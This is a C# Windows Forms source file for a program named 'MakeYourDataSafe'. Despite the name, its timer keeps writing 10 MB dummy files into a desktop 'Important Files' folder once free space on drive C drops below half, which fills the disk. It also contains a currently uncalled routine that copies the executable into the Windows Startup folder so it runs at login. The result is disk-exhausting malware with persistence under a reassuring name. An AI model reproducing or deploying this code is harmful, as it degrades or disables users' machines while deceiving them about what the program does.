﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace MakeYourDataSafe_Client
{
    public partial class mainForm : Form
    {
        //public string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\MakeYourDataSafe";
        public string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\MakeYourDataSafe\\Important Files";

        public mainForm()
        {
            InitializeComponent();
        }

        private void mainForm_Load(object sender, EventArgs e)
        {   
            if (Directory.Exists(path) == false)
            {
                Directory.CreateDirectory(path);
            }
            timer1.Start();
            //copyfile();
            //;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            label1.Text = "Total: " + getDiskSize('C') + " | Free: " + getFreeDiskSpace('C');
            if (getFreeDiskSpace('C') < getDiskSize('C') * 0.5)
            {
                int i = Directory.GetFiles(path).Length;
                File.WriteAllBytes(path + "\\file" + i + ".txt", new byte[10485760]);
            }

            //Appdataba rakni fájlokat, ha még van elég hely
        }

        private long getFreeDiskSpace(char driveName)
        {
            foreach (DriveInfo item in DriveInfo.GetDrives())
            {
                if (item.Name[0] == driveName)
                {
                    return item.AvailableFreeSpace;
                }
            }
            return 0;
        }

        private long getDiskSize(char driveName)
        {
            foreach (DriveInfo item in DriveInfo.GetDrives())
            {
                if (item.Name[0] == driveName)
                {
                    return item.TotalSize;
                }
            }
            return 0;
        }

        private void copyfile()
        {
            string i = System.Reflection.Assembly.GetEntryAssembly().Location;
            
            Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
            DirectoryInfo info = new DirectoryInfo(".");
            string o = info.Root + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"+ System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
            File.Copy(i, o);
        }
    }
}
